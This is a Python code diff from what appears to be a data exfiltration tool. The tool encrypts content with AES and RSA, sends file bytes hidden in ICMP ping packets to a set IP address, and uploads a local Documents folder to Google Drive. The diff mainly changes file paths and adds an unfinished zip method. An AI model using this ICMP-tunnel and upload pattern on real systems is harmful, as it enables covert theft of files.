@@ -94,7 +94,7 @@ class Cipher:
     encryptedcontent = cipher.encrypt(content)        #Passing data packet to be encrypted
 
     #RSA Encryption portion 
-    public_key = RSA.importKey(open("RSAkeys\public.pem").read())  #Retrieve our public key
+    public_key = RSA.importKey(open("..\..\RSAkeys\public.pem").read())  #Retrieve our public key
     rsa = PKCS1_OAEP.new(public_key)
     cipherkey = rsa.encrypt(aeskey)                             #Encrypting the randomly generated 24 AES key
     
@@ -185,6 +185,9 @@ class Pinger:
         databytes
       )
       self.tunnel.sendto(packet, (self.ipAddress,1))
+    
+  def zip_file(self,data):
+    out = io.BytesIO()
 
 
   def prepareping(self) -> None:
@@ -231,12 +234,12 @@ class Pinger:
           Pinger.sendPing(self, bytes_read)       #Subsequent packets sending of ping
 
 def uploadToDrive():
-    gauth = GoogleAuth(settings_file='Auth/settings.yaml')           
+    gauth = GoogleAuth(settings_file='../../Auth/settings.yaml')           
     drive = GoogleDrive(gauth)  
     # Ensure that credentials.json and settings.yaml is in the same folder as this python file
     
     upload_file_list = []
-    file_upload_path = 'Documents'
+    file_upload_path = '..\..\Documents'
 
     # get the list of file name from a specified path
     for path in os.listdir(file_upload_path):
